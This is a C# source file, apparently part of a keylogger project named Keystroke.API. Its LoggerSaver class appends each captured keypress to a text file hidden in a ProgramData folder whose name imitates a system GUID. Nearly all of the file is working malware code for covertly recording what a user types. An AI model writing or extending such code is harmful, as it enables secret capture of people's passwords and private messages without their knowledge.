using System;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using Keystroke.API.CallbackObjects;

namespace Keystroke.API.Helpers
{
    public class LoggerSaver
    {
        public static readonly string LogginDirectory = @"C:\ProgramData\{EEO87LO-8718-8YAT-991A-2F0018AI5879}";
        public static readonly string LogginFile = @"\loggedData.txt";
        
        public delegate void OnUserTypingEventHandler(object sender, EventArgs args);
        public event OnUserTypingEventHandler UserTyping;

        public void LogDataToFile(KeyPressed keyPressedCallback)
        {
            //Convert the pressed key to a string
            var keyPressed = Convert.ToString(keyPressedCallback);
            
            // Check the logs directory if exists or not (if not it will create new one)
            if (!Directory.Exists(LogginDirectory))
            {
                Directory.CreateDirectory(LogginDirectory);
                Console.WriteLine("create directory");
            }
            
            // Check the logs file if exists or not (if not it will create new one)
            if (!File.Exists(LogginDirectory + LogginFile))
            {
                var logs = File.Create(LogginDirectory + LogginFile);
                logs.Close();
                Console.WriteLine("create a file");
            }
            File.AppendAllText(LogginDirectory + LogginFile, keyPressed);
            
            OnUserTyping();
        }


        protected virtual void OnUserTyping()
        {
            if (UserTyping != null)
                UserTyping(this, EventArgs.Empty);
        }
        
    }
    
}